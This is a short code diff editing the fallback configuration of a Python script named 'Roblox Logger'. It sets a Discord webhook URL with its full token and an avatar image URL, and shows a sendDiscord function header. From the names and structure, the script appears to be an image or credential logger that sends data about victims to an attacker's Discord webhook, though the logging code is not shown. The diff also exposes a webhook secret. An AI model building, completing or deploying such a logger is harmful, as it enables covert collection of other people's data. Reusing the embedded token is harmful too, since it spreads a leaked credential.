@@ -7,10 +7,10 @@ try:
         config = _json.load(f)
 except:
     config = {
-        "webhook":  "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN"
-        "image": "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN"
+        "webhook": "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN",
+        "image": "https://tr.rbxcdn.com/30DAY-Avatar-720F5A8A7B9B1C2D3E4F5060708090A1-Png/352/352/Avatar/Webp",  # <-- needs a real image URL
         "username": "Roblox Logger",
-        "color": 16711680,
+        "color": 16711680
     }
 
 def sendDiscord(webhook, json_data):
